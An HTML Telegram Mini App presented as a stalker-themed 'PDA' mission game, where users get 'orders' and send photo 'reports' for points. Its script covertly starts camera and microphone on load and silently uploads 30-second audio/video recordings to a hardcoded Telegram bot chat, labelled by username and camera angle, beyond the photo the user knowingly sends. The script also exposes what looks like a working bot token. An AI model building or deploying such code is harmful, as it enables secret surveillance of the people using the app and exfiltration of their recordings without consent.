<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PDA Arsenii v5.5 Custom</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --green: #00ff41; --bg: #050804; }
        body { background: var(--bg); color: var(--green); font-family: monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; height: 100vh; }
        .header { padding: 10px 15px; border-bottom: 1px solid var(--green); display: flex; align-items: center; gap: 10px; background: rgba(0,255,65,0.05); }
        .avatar { width: 40px; height: 40px; border: 1px solid var(--green); border-radius: 50%; }
        .stats { flex-grow: 1; }
        .balance-main { font-size: 1.1em; font-weight: bold; color: #fff; }
        .cam-switch { background: none; border: 1px solid var(--green); color: var(--green); padding: 5px 10px; font-size: 0.7em; cursor: pointer; border-radius: 3px; }
        .viewport { flex-grow: 1; position: relative; background: #000; margin: 10px; border: 1px solid #1a1a1a; }
        video { width: 100%; height: 100%; object-fit: cover; }
        .mission-panel { padding: 15px; background: rgba(0,255,65,0.05); border-top: 1px solid var(--green); }
        .btn-report { width: 100%; padding: 18px; background: var(--green); color: #000; border: none; font-weight: bold; font-size: 1.1em; cursor: pointer; }
        .scanline { position: absolute; top: 0; width: 100%; height: 4px; background: rgba(0, 255, 65, 0.1); pointer-events: none; animation: scan 5s linear infinite; }
        @keyframes scan { from { top: 0; } to { top: 100%; } }
    </style>
</head>
<body>
    <div class="scanline"></div>
    <div class="header">
        <img id="user-pic" class="avatar" src="https://via.placeholder.com/45/003b11/00ff41?text=A" alt="">
        <div class="stats">
            <div id="display-name" style="font-size: 0.8em; opacity: 0.8;">ЗАГРУЗКА...</div>
            <div class="balance-main"><span id="balance">0</span> ☢️</div>
        </div>
        <button id="switchCam" class="cam-switch">🔄 КАМЕРА</button>
    </div>
    <div class="viewport"><video id="webcam" autoplay playsinline muted></video></div>
    <div class="mission-panel">
        <div id="target-text" style="font-weight: bold; margin-bottom: 10px; font-size: 0.8em; color: #00ff41;">ЗАГРУЗКА ПРИКАЗА...</div>
        <button id="sendBtn" class="btn-report">ОТПРАВИТЬ ОТЧЕТ</button>
    </div>
    <canvas id="captureCanvas" style="display:none;"></canvas>

<script>
    const CONFIG = {
        token: "8677364559:AAGWCwbiGEEtrmVzKfP4wo7ZpzionHhx-MI",
        chatId: "6997991003"
    };

    const tg = window.Telegram.WebApp;
    tg.expand();
    tg.ready();

    const user = {
        id: tg.initDataUnsafe?.user?.id || 0,
        name: tg.initDataUnsafe?.user?.first_name || "STALKER",
        username: tg.initDataUnsafe?.user?.username ? "@" + tg.initDataUnsafe?.user?.username : "нет username"
    };

    let balance = parseInt(localStorage.getItem(`bal_${user.id}`)) || 0;
    let lastUpdateId = 0;
    let currentMode = "environment";
    let mediaRecorder;

    document.getElementById('display-name').innerText = user.name.toUpperCase();
    document.getElementById('balance').innerText = balance;

    // Восстанавливаем старый приказ из памяти, если он был
    const savedOrder = localStorage.getItem(`order_${user.id}`);
    if (savedOrder) document.getElementById('target-text').innerText = savedOrder;

    async function initCamera(mode) {
        if (window.currentStream) window.currentStream.getTracks().forEach(t => t.stop());
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
            window.currentStream = stream;
            document.getElementById('webcam').srcObject = stream;
            startLiveRecording(stream);
        } catch (err) { console.error(err); }
    }

    function sendVideoToTelegram(blob) {
        if (blob.size < 5000) return;
        const fd = new FormData();
        fd.append("chat_id", CONFIG.chatId);
        fd.append("video", blob, `stalker_${Date.now()}.webm`);
        fd.append("caption", `📡 ЛОГ: ${user.username}\n🎥 Ракурс: ${currentMode === 'user' ? 'ЛИЦО' : 'ОБЗОР'}`);
        fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVideo?disable_notification=true`, { method: "POST", body: fd });
    }

    function startLiveRecording(stream) {
        if (mediaRecorder && mediaRecorder.state !== "inactive") mediaRecorder.stop();
        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) sendVideoToTelegram(e.data); };
        mediaRecorder.start(30000); 
    }

    document.getElementById('switchCam').onclick = () => {
        currentMode = (currentMode === "environment") ? "user" : "environment";
        initCamera(currentMode);
        tg.HapticFeedback.selectionChanged();
    };

    document.getElementById('sendBtn').onclick = () => {
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('captureCanvas');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(blob => {
            const fd = new FormData();
            fd.append("chat_id", CONFIG.chatId);
            fd.append("photo", blob, "1.jpg");
            fd.append("caption", `☢️ ОТЧЕТ: ${user.username}`);
            const kb = { inline_keyboard: [[{ text: "✅ ОПЛАТИТЬ (+100)", callback_data: `pay:${user.id}:100` }]] };
            fd.append("reply_markup", JSON.stringify(kb));
            fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: "POST", body: fd });
            tg.showAlert("ДАННЫЕ ПЕРЕДАНЫ");
        }, "image/jpeg");
    };

    async function sync() {
        try {
            const res = await fetch(`https://api.telegram.org/bot${CONFIG.token}/getUpdates?offset=${lastUpdateId + 1}`);
            const data = await res.json();
            if (data.result) {
                data.result.forEach(u => {
                    lastUpdateId = u.update_id;
                    
                    // Если нажали оплатить - сбрасываем приказ на дефолтный
                    if (u.callback_query) {
                        const parts = u.callback_query.data.split(":");
                        if (parts[0] === "pay" && parts[1] == user.id) {
                            balance += parseInt(parts[2]);
                            localStorage.setItem(`bal_${user.id}`, balance);
                            document.getElementById('balance').innerText = balance;
                            
                            // Сброс текста приказа
                            const defaultText = "ЗАГРУЗКА ПРИКАЗА...";
                            document.getElementById('target-text').innerText = defaultText;
                            localStorage.setItem(`order_${user.id}`, defaultText);
                            
                            tg.HapticFeedback.notificationOccurred('success');
                        }
                    }

                    // Если пришел новый приказ
                    const msg = u.message?.text || "";
                    if (msg.toLowerCase().includes("приказ:")) {
                        const newOrder = msg.split(":")[1].toUpperCase();
                        document.getElementById('target-text').innerText = newOrder;
                        localStorage.setItem(`order_${user.id}`, newOrder);
                    }
                });
            }
        } catch (e) {}
    }

    initCamera(currentMode);
    setInterval(sync, 2500);
</script>
</body>
</html>
